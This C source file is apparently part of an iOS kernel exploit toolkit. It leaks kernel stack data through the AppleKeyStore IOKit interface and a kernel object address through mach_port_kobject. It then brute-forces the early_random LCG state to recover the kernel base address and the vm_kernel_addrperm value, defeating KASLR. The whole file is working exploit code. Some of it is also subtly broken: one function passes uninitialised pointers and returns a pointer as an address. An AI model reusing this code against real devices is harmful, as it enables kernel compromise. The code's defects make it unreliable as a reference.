//
//  earlyrandom.c
//  patch
//
//  Created by Joshua Hill on 7/22/14.
//
//

#include <stdio.h>
#include <syslog.h>

#include <mach/vm_map.h>
#include <mach/host_priv.h>
#include <mach/mach_init.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>
#include <mach/mach_types.h>

#include <IOKit/IOKit.h>
#include <IOKit/IOKitLib.h>

#include "kernel.h"
#include "earlyrandom.h"

static uint64_t
get_prev_output( uint64_t output, uint8_t bits, uint32_t n )
{
    uint32_t i, j;
    uint64_t s, sa[4];
    // Only lower 19 bits of input state needed
    s = ( output & 0xffff ) << 3 | bits;
    // Go back to starting state of current output
    for ( j = 0; j < 3; j++ )
    {
        s = ( s - 12345 ) * 125797;
    }
    // Backtrack n outputs (four LCG rounds per output)
    for ( i = 0; i < n; i++ )
    {
        for ( j = 0; j < 4; j++ )
        {
            s = sa[j] = ( s - 12345 ) * 125797;
        }
    }
    return ( ( sa[0] >> 3 ) & 0xffff ) |
    ( ( ( sa[1] >> 3 ) << 16 ) & 0xffff0000 ) |
    ( ( ( sa[2] >> 3 ) << 32 ) & 0xffff00000000 ) |
    ( ( ( sa[3] >> 3 ) << 48 ) & 0xffff000000000000 );
}

static uint64_t
get_next_output( uint64_t output, uint8_t bits, uint32_t n )
{
    uint32_t i, j;
    uint64_t s, sa[4];
    // Only lower 19 bits of input state needed
    s = ( output & 0xffff ) << 3 | bits;
    // Skip ahead n outputs
    for ( i = 0; i < n; i++ )
    {
        // Four LCG rounds per output
        for ( j = 0; j < 4; j++ )
        {
            s = sa[j] = 1103515245 * s + 12345;
        }
    }
    return ( ( sa[3] >> 3 ) & 0xffff ) |
    ( ( ( sa[2] >> 3 ) << 16 ) & 0xffff0000 ) |
    ( ( ( sa[1] >> 3 ) << 32 ) & 0xffff00000000 ) |
    ( ( ( sa[0] >> 3 ) << 48 ) & 0xffff000000000000 );
}

static uint64_t
get_output( uint64_t output, uint8_t bits, int n )
{
    if (n < 0) {
        return get_prev_output(output, bits, -n);
    }
    if (n > 0) {
        return get_next_output(output, bits, n);
    }
    if (n == 0) {
        return output;
    }
    return 0;
}

static int recover_prng_output_64(uint64_t pointer, uint64_t *output, uint8_t *weak)
{
    uint64_t state_1, state_2, state_3, state_4;
    uint64_t value_c;
    uint8_t bits, carry;
    
    // Brute force carry bit
    for (carry = 0; carry < 2; carry++)
    {
        value_c = (pointer - (carry * 0x100000000)) - 0xffffff8000000000;
        // Brute force the least significant bits of the state,
        // discarded from the PRNG output
        for (bits = 0; bits < 8; bits++)
        {
            state_1 = (((value_c >> 48) & 0xffff) << 3) | bits;
            state_2 = 1103515245 * state_1 + 12345;
            if (((state_2 >> 3) & 0xffff) == ((value_c >> 32) & 0xffff))
            {
                // Compute the full PRNG output
                state_3 = 1103515245 * state_2 + 12345;
                state_4 = 1103515245 * state_3 + 12345;
                *output = (((state_1 >> 3) & 0xffff) << 48) |
                (((state_2 >> 3) & 0xffff) << 32) |
                (((state_3 >> 3) & 0xffff) << 16) |
                (((state_4 >> 3) & 0xffff));
                *weak = state_4 & 7;
                return 1;
            }
        }
    }
    return 0;
}

static int recover_prng_output_32(uint32_t value, uint64_t *output, uint8_t *weak, uint16_t mask, uint8_t *startbit)
{
    uint64_t state_1, state_2, state_3, state_4;
    uint64_t value_c;
    uint8_t bits;
    
    value_c = value;
    
    for (bits = *startbit; bits < 8; bits ++)
    {
        state_1 = (((value_c >> 16) & 0xffff) << 3) | bits;
        state_2 = 1103515245 * state_1 + 12345;
        if ((((state_2 >> 3) & mask)) == ((value_c) & mask))
        {
            *output = (((state_1 >> 3) & 0xffff) << 16 ) |
            (((state_2 >> 3) & 0xffff) << 0);
            *weak = state_2 & 7;
            *startbit = bits;
            return 1;
        }
    }
    return 0;
}

bool get_all_kernel_slides(vm_address_t *pKrnlBase, vm_address_t *pVmPerm)
{
    CFMutableDictionaryRef matching = IOServiceMatching("AppleKeyStore");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    io_connect_t connection;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    if (kr != KERN_SUCCESS)
        return false;
    
    unsigned int type;
    mach_vm_address_t obj_addr = 0;
    mach_port_kobject(mach_task_self(), connection, &type, &obj_addr);
    
    uint64_t output[50] = {0};
    uint32_t outputCount = 50;
    
    kr = IOConnectCallMethod(connection, 0, NULL, 0, NULL, 0, output, &outputCount, NULL, NULL);
    IOServiceClose(connection);
    if (kr != KERN_SUCCESS)
        return false;
    
    vm_address_t *stack_addr = (vm_address_t *)output;
    
    uint64_t prng;
    uint8_t weak;
    vm_address_t vm_perm;
    vm_address_t krnl_base;
    int ret = 0;
    
#ifndef __LP64__
    uint8_t bits = 0;
    uint32_t stack_cookie = stack_addr[18];
    krnl_base = (stack_addr[8] & 0xffe00000) + 0x1000;
    if (stack_addr[1] == 0)
        krnl_base = (stack_addr[9] & 0xffe00000) + 0x1000;
    // 通过规律查找
    //    for (int i=0; i<32; i++)
    //    {
    //        if (stack_addr[i] == 0x7010001)
    //            krnl_base = (stack_addr[i + 5] & 0xffe00000) + 0x1000;
    //        if (stack_addr[i] == 0x1694)
    //            stack_cookie = stack_addr[i - 4];
    //    }
    ret = recover_prng_output_32(stack_cookie, &prng, &weak, 0x00ff, &bits);
    vm_perm = get_output(prng, weak, 6) | 1;
    
    syslog(LOG_ERR, "get lr %x stack %x vmperm %x ret %x", stack_addr[8], stack_cookie, vm_perm, ret);
#else
    ret = recover_prng_output_64((uint64_t)obj_addr, &prng, &weak);
    krnl_base = (stack_addr[10] & 0xffffff80ffe00000) + 0x2000;
    vm_perm = prng | 1;
    // 通过规律查找
    //    for (int i=0; i<16; i++)
    //    {
    //        if (stack_addr[i] == 0x151300000000)
    //            krnl_base = (stack_addr[i - 1] & 0xffffff80ffe00000) + 0x2000;
    //    }
    
    for (int i=0; i<16; i++)
        NSLog(@"%d: %p", i, stack_addr[i]);
#endif
    
    if (ret == 0)
        return false;
    
    *pKrnlBase = krnl_base;
    *pVmPerm = vm_perm;
    
    syslog(LOG_ERR, "Get kernel address %p vmperm %p", (void *)krnl_base, (void *)vm_perm);
    
    
    return true;
}

vm_offset_t earlyrandom_get_slide(kernel_t* kernel) {
    return 0;
}

vm_address_t earlyrandom_get_base(kernel_t* kernel) {
    vm_address_t *krnl_base;
    vm_address_t *vm_perm;
    if(get_all_kernel_slides(krnl_base, vm_perm)) {
        return krnl_base;
    }
    return 0;
}